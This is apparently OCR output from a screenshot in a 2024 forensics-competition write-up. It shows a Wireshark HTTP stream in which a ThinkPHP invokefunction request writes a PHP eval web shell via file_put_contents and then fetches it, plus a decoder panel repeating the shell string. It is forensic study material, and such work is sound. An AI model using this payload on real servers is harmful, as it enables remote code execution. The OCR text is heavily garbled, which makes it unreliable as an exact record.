@@ -1,0 +1,36 @@
+# OCR: c9cda0712754b205d4f8fcc757995fc4.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/c9cda0712754b205d4f8fcc757995fc4.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:13
+
+Wireshark-s HTTp.. (tp.stream:eg.to7]-tcpdump_t.cap
+GET/2s=/admin/thinklapp/inwokefunction&ifunction=call_userfunc_array&vars[0]=file_put_contents&vars[110=peigiphp&vars[1]D=?php%20@evakS_POST]%27pelqi%27D?>HTTP/1.1 User-Agent:Java/11:0.13
+Host:222.22.180
+Accept:text/html,image/gif,image/ipeg.q=.2,*jq=.2 Connectionekeep-alive
+HTTP/1.1200OK Server:nginx
+Date: Fri, 04 Mar 2022 07:15:13 GMT Content-Type:text/htmt: charset=utf-8 Transfer-Encoding:chunked
+Connectiorckeep-alive Vary,Accept-Encoding
+30GET/peigiphp HTTP/1.1 User-Agent:Java/11.0.13 Host:222.22.180
+Accept:text/htm,mage/gif,mage/jpeg,q=,2*/q=2
+Connectionc keep-alive HTTP/1.1.200. OK Server:nginx
+Date:Fri,04Mar202207:15:13GMT Content-Type;text/htmt charset=UTF-8 Transfer-Encoding:chunked
+Connection:keep-alive Vary:.Accept-Encoding
+ctoolurtX
+OCtool1,412
+常用
+加解盟/签名
+投验
+编解码
+Hex/String
+Base64URL码
+UnicodeJWT解码
+编码
+<7php%20@eval(S_POST%27peiq/%27)7:
+<?php@eval($_POSTrpeiq?（尚聪/量设请点由此处反课给我们
+转澡
+生成
+其他
+Htm码GZip 解码
+股家工具
+团 Q器
